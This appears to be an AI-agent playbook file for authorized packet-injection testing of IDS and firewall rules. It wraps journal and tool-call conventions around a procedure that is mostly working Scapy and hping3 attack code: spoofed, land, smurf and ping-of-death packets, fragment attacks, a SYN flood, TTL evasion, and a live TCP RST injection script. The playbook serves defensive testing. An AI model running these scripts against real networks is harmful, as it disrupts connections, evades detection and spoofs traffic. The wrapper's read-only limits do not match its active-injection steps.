---
name: cb-packet-injection-attack
skill_id: cb-packet-injection-attack
journal_id: CB-SKL-306
description: Cold-box analyst playbook — Packet Injection Attack. Crafts and injects
  custom network packets using Scapy, hping3, and Nemesis during authorized security
  assessments to test firewall rules, IDS detection, protocol handling, and network
  stack resilience against malformed and spoofed traffic.
domain: cold-box
subdomain: network-security
tier: adjacent
case_profiles:
- network_pcap
execution_mode: sift_runnable
artifact_platforms:
- any
host_platforms:
- linux
tags:
- network-security
- packet-injection
- scapy
- hping3
- protocol-testing
cold_box_version: 2
inspired_by: performing-packet-injection-attack
---

# Packet Injection Attack (cold-box)

> **Journal ID:** `CB-SKL-306` — cite this in every journal entry while following this playbook.

## Cold-box constraints (always)

- Evidence lives on the **sealed operation table** — read only through the viewport (`input_relpath`).
- **Never write** on `operation-table/`; tool output goes to `records/{case_id}/scratch/`.
- **Log this playbook** in the case journal with **`CB-SKL-306`** (`log_skill`) when you adopt it and at each major step.
- Every SIFT execution: `run_sift_tool` with **`purpose`**, **`why`**, and cite returned **`tool_id`** + **`audit_id`** in the journal.
- Prefer `list_sift_tools(verified_only=true)` — skip `[BAD — DO NOT USE]` tools.
- Load this playbook with `get_skill("cb-packet-injection-attack")`; do not treat markdown code blocks as direct shell commands.

## Agent loop

1. `suggest_skills(case_profile=...)` or `get_skill("cb-packet-injection-attack")` → note **`CB-SKL-306`**
2. `log_skill(case_id, journal_id="CB-SKL-306", action="adopted", note="...")`
3. `list_sift_tools(verified_only=true)` → pick tools from the map below
4. `describe_sift_tool(tool_id)` → `run_sift_tool(...)` → journal stdout with `CB-SKL-306` + `audit_id`
5. `log_skill(..., action="finding", note="...")` when recording conclusions; self-correct if outputs conflict


## When to use

- Testing IDS/IPS rules by injecting traffic that should trigger specific detection signatures
- Validating firewall rules by crafting packets with specific flags, source addresses, and payloads
- Assessing network stack resilience to malformed packets, fragmentation attacks, and protocol violations
- Simulating spoofed traffic to test anti-spoofing controls (BCP38, uRPF)
- Performing TCP reset injection to test connection resilience and session hijacking scenarios

## Tool map (SIFT via MCP)

**Execution mode:** `sift_runnable` — SIFT tools below are available on this host.

| binary | tool_id | verified | available |
|--------|---------|----------|-----------|
| `wireshark` | `SIFT-118` | no | yes |
| `tcpdump` | `SIFT-116` | no | yes |
| `head` | `SIFT-011` | yes | yes |
| `grep` | `SIFT-010` | yes | yes |

## Cold-box MCP examples

Use these instead of running shell blocks directly. Always log `{journal_id}` in purpose/why or via `log_skill`.

### `wireshark` → `SIFT-118`

```json
{
  "tool_id": "SIFT-118",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-306] wireshark per playbook step",
  "why": "Executing cb-packet-injection-attack \u2014 see Procedure section",
  "extra_args": []
}
```

### `tcpdump` → `SIFT-116`

```json
{
  "tool_id": "SIFT-116",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-306] tcpdump per playbook step",
  "why": "Executing cb-packet-injection-attack \u2014 see Procedure section",
  "extra_args": []
}
```

### `head` → `SIFT-011`

```json
{
  "tool_id": "SIFT-011",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-306] head per playbook step",
  "why": "Executing cb-packet-injection-attack \u2014 see Procedure section",
  "extra_args": []
}
```

### `grep` → `SIFT-010`

```json
{
  "tool_id": "SIFT-010",
  "case_id": "{case_id}",
  "input_relpath": "{artifact_relpath}",
  "purpose": "[CB-SKL-306] grep per playbook step",
  "why": "Executing cb-packet-injection-attack \u2014 see Procedure section",
  "extra_args": []
}
```

## Journal logging

When you adopt this playbook, append to `records/{case_id}/{case_id}.md`:

```markdown
## {timestamp} — skill `CB-SKL-306` (`cb-packet-injection-attack`)

- **action:** adopted | step | finding | deferred | completed
- **note:** What you did or concluded under this playbook
- **related_audit_ids:** (optional) CB-… from run_sift_tool
```

Or call MCP: `log_skill(case_id, journal_id="{journal_id}", action="adopted", note="...")`

## Cold-box path translation

When the procedure below uses host paths, translate as follows:

| Procedure path | Cold-box equivalent |
|----------------|---------------------|
| `C:\Evidence\...` / `/cases/...` | `{input_relpath}` on the sealed table (via viewport) |
| `C:\Output\...` / `/analysis/...` | `records/{case_id}/scratch/` (tool stdout/files) |
| Live SIEM / cloud console steps | **Reference only** on cold-box — note capability gap in journal |

Do not copy evidence off the table except into `records/{case_id}/scratch/` via `run_sift_tool`.


## Procedure

## When to Use

- Testing IDS/IPS rules by injecting traffic that should trigger specific detection signatures
- Validating firewall rules by crafting packets with specific flags, source addresses, and payloads
- Assessing network stack resilience to malformed packets, fragmentation attacks, and protocol violations
- Simulating spoofed traffic to test anti-spoofing controls (BCP38, uRPF)
- Performing TCP reset injection to test connection resilience and session hijacking scenarios

**Do not use** for denial-of-service attacks against production systems, for spoofing traffic to frame third parties, or without explicit authorization for the target network.

## Prerequisites

- Written authorization specifying in-scope targets and approved packet injection techniques
- Scapy, hping3, and Nemesis installed on the testing platform
- Root/sudo privileges for raw socket access and packet crafting
- Wireshark or tcpdump on the target side to verify packet delivery
- Understanding of TCP/IP protocol internals, header fields, and flag combinations

## Workflow

### Step 1: Craft and Send Basic Test Packets with Scapy

```python
#!/usr/bin/env python3
"""Basic packet injection examples using Scapy for authorized testing."""

from scapy.all import *

# TCP SYN packet (port scan simulation)
syn = IP(dst="10.10.20.10") / TCP(dport=80, flags="S", seq=1000)
response = sr1(syn, timeout=2, verbose=0)
if response and response.haslayer(TCP):
    if response[TCP].flags == "SA":
        print(f"[*] Port 80 is OPEN (SYN-ACK received)")
    elif response[TCP].flags == "RA":
        print(f"[*] Port 80 is CLOSED (RST-ACK received)")

# TCP XMAS scan packet (all flags set)
xmas = IP(dst="10.10.20.10") / TCP(dport=80, flags="FPU")
send(xmas, verbose=0)
print("[*] XMAS packet sent (should trigger IDS)")

# NULL scan packet (no flags)
null = IP(dst="10.10.20.10") / TCP(dport=80, flags="")
send(null, verbose=0)
print("[*] NULL packet sent")

# Crafted ICMP packet with custom payload
icmp_custom = IP(dst="10.10.20.10") / ICMP(type=8) / Raw(load="SECURITY_TEST_PAYLOAD")
send(icmp_custom, verbose=0)
print("[*] Custom ICMP packet sent")

# UDP packet to test firewall rules
udp_test = IP(dst="10.10.20.10") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="test.example.com"))
response = sr1(udp_test, timeout=2, verbose=0)
if response:
    print(f"[*] DNS response received from {response[IP].src}")
```

### Step 2: IP Spoofing and Anti-Spoofing Validation

```python
#!/usr/bin/env python3
"""Test anti-spoofing controls with spoofed source IP packets."""

from scapy.all import *

# Spoofed source IP (should be blocked by BCP38/uRPF)
spoofed_syn = IP(src="192.0.2.100", dst="10.10.20.10") / TCP(dport=80, flags="S")
send(spoofed_syn, verbose=0)
print("[*] Sent SYN with spoofed source 192.0.2.100")

# Land attack test (source = destination)
land = IP(src="10.10.20.10", dst="10.10.20.10") / TCP(sport=80, dport=80, flags="S")
send(land, verbose=0)
print("[*] Land attack packet sent (src==dst)")

# Smurf attack test (ICMP to broadcast with spoofed source)
smurf = IP(src="10.10.20.10", dst="10.10.20.255") / ICMP(type=8)
send(smurf, verbose=0)
print("[*] Smurf test packet sent (ICMP to broadcast)")

# IP fragment overlap test
frag1 = IP(dst="10.10.20.10", flags="MF", frag=0) / TCP(dport=80, flags="S") / Raw(load="A"*24)
frag2 = IP(dst="10.10.20.10", frag=2) / Raw(load="B"*24)  # Overlapping fragment
send(frag1, verbose=0)
send(frag2, verbose=0)
print("[*] Overlapping IP fragments sent")
```

### Step 3: TCP Session Manipulation

```bash
# TCP RST injection to test connection resilience
# Using hping3 to send RST packets
sudo hping3 -S -p 80 --rst -c 5 10.10.20.10

# SYN flood test (limited volume for testing, not DoS)
sudo hping3 -S --flood -V -p 80 -c 100 10.10.20.10
# Note: --flood sends at maximum rate; -c 100 limits to 100 packets

# Test TCP window manipulation
sudo hping3 -S -p 80 -w 0 -c 5 10.10.20.10  # Zero window
sudo hping3 -S -p 80 -w 65535 -c 5 10.10.20.10  # Max window

# Idle scan probe (to test if a host can be used as zombie)
sudo hping3 -SA -p 80 -c 3 10.10.20.10
# Check IP ID values in response for predictability
```

```python
#!/usr/bin/env python3
"""TCP RST injection to test session resilience."""

from scapy.all import *

# Sniff for an active TCP connection and inject RST
def rst_inject(pkt):
    if pkt.haslayer(TCP) and pkt[TCP].flags == "A":
        rst = IP(
            src=pkt[IP].dst,
            dst=pkt[IP].src
        ) / TCP(
            sport=pkt[TCP].dport,
            dport=pkt[TCP].sport,
            seq=pkt[TCP].ack,
            flags="R"
        )
        send(rst, verbose=0)
        print(f"[*] RST injected: {pkt[IP].src}:{pkt[TCP].sport} -> {pkt[IP].dst}:{pkt[TCP].dport}")

# Sniff for 10 packets and attempt RST injection
print("[*] Listening for TCP ACK packets to inject RST...")
sniff(filter="tcp and host 10.10.20.10", prn=rst_inject, count=10, iface="eth0")
```

### Step 4: Protocol Anomaly Testing

```python
#!/usr/bin/env python3
"""Protocol anomaly packets for IDS/firewall testing."""

from scapy.all import *

target = "10.10.20.10"

# Ping of Death (oversized ICMP - should be blocked)
pod = IP(dst=target) / ICMP() / Raw(load="X" * 65500)
send(fragment(pod), verbose=0)
print("[*] Ping of Death fragments sent")

# Tiny fragment attack (TCP header split across fragments)
tiny_frag = IP(dst=target, flags="MF", frag=0) / Raw(load=bytes(TCP(dport=80, flags="S"))[:8])
tiny_frag2 = IP(dst=target, frag=1) / Raw(load=bytes(TCP(dport=80, flags="S"))[8:])
send(tiny_frag, verbose=0)
send(tiny_frag2, verbose=0)
print("[*] Tiny fragment attack packets sent")

# Invalid TCP flag combinations
invalid_flags = [
    ("SYN+FIN", "SF"),
    ("SYN+RST", "SR"),
    ("FIN only (no session)", "F"),
    ("All flags", "FSRPAUEC"),
]

for name, flags in invalid_flags:
    pkt = IP(dst=target) / TCP(dport=80, flags=flags)
    send(pkt, verbose=0)
    print(f"[*] Sent packet with invalid flags: {name}")

# TTL-based evasion (packets that expire before reaching IDS)
# Assumes IDS is 2 hops away, target is 5 hops
ttl_evade = IP(dst=target, ttl=3) / TCP(dport=80, flags="S")
send(ttl_evade, verbose=0)
print("[*] Low-TTL evasion packet sent (TTL=3)")

# IP options padding
ip_opts = IP(dst=target, options=[IPOption_RR()]) / TCP(dport=80, flags="S")
send(ip_opts, verbose=0)
print("[*] Packet with IP Record Route option sent")
```

### Step 5: Verify IDS Detection

```bash
# Check Snort/Suricata for alerts triggered by injected packets
grep -i "xmas\|null\|land\|smurf\|ping.of.death\|fragment" /var/log/suricata/eve.json | \
  python3 -m json.tool | head -50

# Expected IDS alerts:
# - XMAS scan detected (SID: 2100330)
# - NULL scan detected (SID: 2100331)
# - Land attack detected
# - Smurf attack detected
# - Fragmentation anomaly
# - Invalid TCP flags

# Verify firewall dropped spoofed packets
sudo iptables -L -n -v | grep -i drop

# Check for fragmentation reassembly errors
dmesg | grep -i "fragment\|frag"
```

### Step 6: Document Results

```bash
# Generate test results summary
cat > packet_injection_report.txt << 'EOF'
Packet Injection Test Results
=============================
Date: $(date)
Target: 10.10.20.10
Tester: Security Assessment Team

Test 1: TCP XMAS Scan
  IDS Detection: YES (Suricata SID 2100330)
  Firewall Action: Dropped

Test 2: IP Spoofing (192.0.2.100)
  uRPF Block: YES (packet dropped at edge router)
  IDS Detection: YES (source not in HOME_NET)

Test 3: Fragmentation Overlap
  IDS Detection: YES (stream reassembly anomaly)
  Target Response: Fragments dropped by OS

Test 4: Invalid TCP Flags
  IDS Detection: YES (SYN+FIN, SYN+RST flagged)
  Firewall Action: Dropped
EOF
```

## Key Concepts

| Term | Definition |
|------|------------|
| **Packet Injection** | Crafting and sending network packets with specific header values, payloads, or flag combinations to test network security controls |
| **IP Spoofing** | Setting a false source IP address in crafted packets to test anti-spoofing controls (BCP38, uRPF) or impersonate another host |
| **TCP RST Injection** | Sending forged TCP RST packets to terminate established connections, testing session resilience and connection reset defenses |
| **Fragmentation Attack** | Exploiting IP fragmentation to split malicious payloads across fragments, evading packet inspection that does not reassemble fragments |
| **uRPF (Unicast Reverse Path Forwarding)** | Router-level anti-spoofing mechanism that drops packets if the source IP would not be routable back through the ingress interface |
| **BCP38 (Network Ingress Filtering)** | Best Current Practice for preventing IP spoofing at network borders by filtering packets with source addresses not belonging to the network |

## Tools & Systems

- **Scapy**: Python packet manipulation library for crafting arbitrary network packets with full control over all protocol headers
- **hping3**: Command-line packet generator supporting TCP, UDP, ICMP with control over flags, TTL, window size, and packet rate
- **Nemesis**: Network packet injection tool supporting Ethernet, ARP, IP, TCP, UDP, ICMP, DNS, and other protocols
- **tcpreplay**: Tool for replaying captured PCAP files at controlled rates for testing IDS rules against known traffic patterns
- **Nping**: Nmap's packet generation tool for crafting probes with arbitrary TCP/UDP/ICMP headers

## Common Scenarios

### Scenario: Validating IDS Rules After Deployment

**Context**: A SOC team deployed new Suricata rules for detecting reconnaissance and evasion techniques. They need to validate that the rules trigger correctly before going live. The testing is performed in a staging environment replicating the production network.

**Approach**:
1. Craft XMAS, NULL, and FIN scan packets using Scapy and send to test targets to verify scan detection rules
2. Generate packets with invalid TCP flag combinations (SYN+FIN, SYN+RST) to test protocol anomaly rules
3. Send oversized ICMP packets and fragmented payloads to test fragmentation detection rules
4. Inject packets with spoofed source IPs to verify anti-spoofing rules fire correctly
5. Send TCP RST injection packets during an active HTTP session to test session disruption detection
6. Verify that all expected Suricata alerts appear in the EVE JSON log with correct severity and metadata
7. Document which rules fired, which did not, and recommend rule tuning for any gaps

**Pitfalls**:
- Sending injection packets too fast and overwhelming the test network or IDS sensor
- Crafting packets with incorrect checksum calculations, causing them to be silently dropped before reaching the IDS
- Not accounting for stateful firewalls that drop out-of-state packets before they reach the IDS for inspection
- Testing from behind a NAT that modifies source ports and breaks crafted TCP sequences

## Output Format

```
## Packet Injection Test Report

**Target**: 10.10.20.10 (test-server-01)
**IDS Sensor**: suricata-staging-01
**Test Date**: 2024-03-15

### Test Matrix

| Test | Packet Type | Expected Detection | Actual Result |
|------|-------------|-------------------|---------------|
| 1 | TCP XMAS Scan | SID 2100330 | DETECTED |
| 2 | TCP NULL Scan | SID 2100331 | DETECTED |
| 3 | SYN+FIN Invalid | SID 2100332 | DETECTED |
| 4 | IP Spoofed Source | SID 2003000 | DETECTED |
| 5 | Land Attack | SID 2100333 | NOT DETECTED |
| 6 | Fragment Overlap | SID 2200001 | DETECTED |
| 7 | Ping of Death | SID 2100334 | DETECTED |
| 8 | TCP RST Injection | Custom SID | NOT DETECTED |

### Detection Rate: 6/8 (75%)

### Gaps Identified
1. Land attack (src==dst) not detected -- add rule SID 2100333
2. TCP RST injection not detected -- create custom rule for out-of-window RST
```

## Self-correction

- If a SIFT tool errors, read `describe_sift_tool` and pick an alternate from the tool map.
- If procedure steps require SIEM/cloud/live APIs, log `{journal_id}` + `action=deferred` with the gap.
- Do not override `[BAD — DO NOT USE]` tools.
- Mark inference vs confirmed in journal; tie confirmed findings to `audit_id`.

## Limits

- Playbooks guide reasoning; **confirmed findings require tool output** in scratch with matching `audit_id`.
- Reference-mode steps are not executable on cold-box until equivalent SIFT tooling exists.
